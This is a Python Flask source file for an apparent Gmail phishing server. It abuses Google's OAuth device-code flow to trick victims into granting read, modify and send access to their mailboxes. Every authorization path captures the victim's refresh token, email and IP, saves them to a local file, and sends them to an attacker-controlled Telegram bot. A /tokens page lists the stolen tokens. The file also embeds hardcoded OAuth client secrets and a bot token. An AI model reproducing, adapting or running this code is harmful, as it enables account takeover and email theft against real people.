from flask import Flask, request, redirect, session, render_template_string
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Needed for session storage

# === GOOGLE OAUTH CONFIG — UPDATE THESE ===
CLIENT_ID = "870868575995-luhgcleqlgjb28tckh6tmidfea3vc3dp.apps.googleusercontent.com"
CLIENT_SECRET = "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"
RENDER_URL = "https://gmail-oauth.onrender.com"
REDIRECT_URI = f"{RENDER_URL}/callback"  # Keep for compatibility, but device flow won't use it
SCOPES = "openid https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/gmail.send"

# === TELEGRAM CONFIG ===
TG_BOT_TOKEN = "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs"
TG_CHAT_ID = "7554731151"

# === TOKEN STORAGE ===
TOKEN_DB = "/tmp/tokens.json"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def save_token(email, refresh_token, access_token, ip):
    db = {}
    if os.path.exists(TOKEN_DB):
        with open(TOKEN_DB) as f:
            db = json.load(f)
    
    db[email] = {
        "refresh_token": refresh_token,
        "access_token": access_token,
        "ip": ip,
        "timestamp": datetime.now().isoformat()
    }
    
    with open(TOKEN_DB, "w") as f:
        json.dump(db, f, indent=2)
    
    print(f"[+] Saved token for {email}")

@app.route('/')
def home():
    return "OAuth server is running. The /auth/gmail endpoint is ready."

# ================================================================
# REPLACED: /auth/gmail now uses device code flow instead of redirect
# ================================================================
@app.route('/auth/gmail')
def auth_gmail():
    """Step 1: Request device code from Google instead of redirecting"""
    resp = requests.post('https://oauth2.googleapis.com/device/code', data={
        'client_id': CLIENT_ID,
        'scope': SCOPES
    })
    device_data = resp.json()
    
    # Store in session for the poll endpoint
    session['device_code'] = device_data['device_code']
    session['user_code'] = device_data['user_code']
    session['verification_url'] = device_data['verification_url']
    
    return render_template_string("""
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
            .code { font-size: 36px; font-weight: bold; background: #f0f0f0; 
                    padding: 15px 30px; display: inline-block; letter-spacing: 6px; 
                    border: 2px dashed #333; margin: 20px 0; }
            .btn { padding: 12px 24px; font-size: 16px; cursor: pointer; 
                   background: #4285f4; color: white; border: none; border-radius: 4px; }
        </style>
    </head>
    <body>
        <h2>Gmail Authorization Required</h2>
        <p><strong>Step 1:</strong> Click the button below to open Google's device page</p>
        <p>
            <a href="{{ verification_url }}" target="_blank">
                <button class="btn">Open google.com/device</button>
            </a>
        </p>
        <p><strong>Step 2:</strong> Enter this code exactly as shown:</p>
        <div class="code">{{ user_code }}</div>
        <p><strong>Step 3:</strong> Click "Continue" and authorize access</p>
        <hr>
        <p>Waiting for authorization...</p>
        <div id="countdown">Checking in 5 seconds...</div>
        <script>
            var seconds = 5;
            setInterval(function() {
                seconds--;
                document.getElementById('countdown').innerText = 'Checking in ' + seconds + ' seconds...';
                if (seconds <= 0) window.location.href = '/poll';
            }, 1000);
        </script>
    </body>
    </html>
    """, user_code=session['user_code'], 
        verification_url=session['verification_url'])

# ================================================================
# NEW: Poll endpoint to wait for user authorization
# ================================================================
@app.route('/poll')
def poll():
    """Step 2: Poll Google until user authorizes, then capture tokens"""
    device_code = session.get('device_code')
    if not device_code:
        return redirect('/auth/gmail')
    
    resp = requests.post('https://oauth2.googleapis.com/token', data={
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'device_code': device_code,
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
    })
    
    token_data = resp.json()
    
    if 'access_token' in token_data:
        # --- USER AUTHORIZED — CAPTURE TOKENS (same as your callback) ---
        refresh_token = token_data.get("refresh_token", "N/A")
        access_token = token_data.get("access_token", "N/A")
        
        # Get user email
        userinfo = requests.get(
            "https://www.googleapis.com/oauth2/v2/userinfo",
            headers={"Authorization": f"Bearer {access_token}"}
        ).json()
        email = userinfo.get("email", "unknown")
        
        # Get IP
        victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if victim_ip and "," in victim_ip:
            victim_ip = victim_ip.split(",")[0].strip()
        
        # Save token locally — YOUR EXISTING FUNCTION
        save_token(email, refresh_token, access_token, victim_ip)
        
        # Send to Telegram — YOUR EXISTING FUNCTION
        msg = f"""[+]___ GMAIL_OAUTH ___[+]
Victim: {email}
Token: {refresh_token}
IP: {victim_ip}"""
        send_telegram(msg)
        
        # Clear device code from session
        session.pop('device_code', None)
        session.pop('user_code', None)
        
        # Redirect victim to landing page
        return redirect("https://your-landing-page.onrender.com/#")
    
    elif token_data.get('error') == 'authorization_pending':
        # User hasn't approved yet — keep polling
        return render_template_string("""
        <html>
        <body style="text-align:center; font-family:Arial; margin-top:50px;">
            <h3>Waiting for authorization...</h3>
            <p>Code: <strong style="font-size:24px;">{{ user_code }}</strong></p>
            <p>Still waiting for you to authorize the app.</p>
            <p>Didn't open the page yet? <a href="{{ verification_url }}" target="_blank">Click here</a></p>
            <div id="countdown">Checking again in 5 seconds...</div>
            <script>
                var seconds = 5;
                setInterval(function() {
                    seconds--;
                    if (seconds <= 0) window.location.href = '/poll';
                }, 1000);
            </script>
        </body>
        </html>
        """, user_code=session.get('user_code', 'N/A'),
            verification_url=session.get('verification_url', ''))
    
    elif token_data.get('error') == 'slow_down':
        # Polling too fast — wait 10 seconds
        return render_template_string("""
        <html><body><p>Waiting... checking again shortly</p>
        <script>setTimeout(function(){ window.location.href = '/poll'; }, 10000);</script>
        </body></html>
        """)
    
    elif token_data.get('error') == 'expired_token':
        # Took longer than 15 minutes
        session.pop('device_code', None)
        return redirect('/auth/gmail')
    
    elif token_data.get('error') == 'access_denied':
        return "Authorization denied. <a href='/auth/gmail'>Try again</a>"
    
    else:
        return f"Unexpected: {token_data} <a href='/auth/gmail'>Try again</a>"

# ================================================================
# KEPT: /callback still works if you want fallback to redirect flow
# ================================================================
@app.route('/callback')
def callback():
    """Legacy redirect-based OAuth flow (kept for compatibility)"""
    code = request.args.get('code')
    if not code:
        return "Authorization failed.", 400

    token_url = "https://oauth2.googleapis.com/token"
    payload = {
        "code": code,
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code"
    }
    resp = requests.post(token_url, json=payload)
    tokens = resp.json()

    refresh_token = tokens.get("refresh_token", "N/A")
    access_token = tokens.get("access_token", "N/A")

    userinfo = requests.get(
        "https://www.googleapis.com/oauth2/v2/userinfo",
        headers={"Authorization": f"Bearer {access_token}"}
    ).json()
    email = userinfo.get("email", "unknown")

    victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if victim_ip and "," in victim_ip:
        victim_ip = victim_ip.split(",")[0].strip()

    save_token(email, refresh_token, access_token, victim_ip)

    msg = f"""[+]___ GMAIL_OAUTH ___[+]
Victim: {email}
Token: {refresh_token}
IP: {victim_ip}"""
    send_telegram(msg)

    return redirect("https://your-landing-page.onrender.com/#")

@app.route('/tokens')
def list_tokens():
    """View captured tokens in browser (for testing)"""
    if not os.path.exists(TOKEN_DB):
        return "No tokens captured yet."
    with open(TOKEN_DB) as f:
        db = json.load(f)
    
    html = "<h1>Captured Tokens</h1><ul>"
    for email, info in db.items():
        html += f"<li><b>{email}</b> — {info['ip']} — {info['timestamp'][:19]}"
        html += f"<br><small>Token: {info['refresh_token'][:50]}...</small></li>"
    html += "</ul>"
    return html

@app.route('/health')
def health():
    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
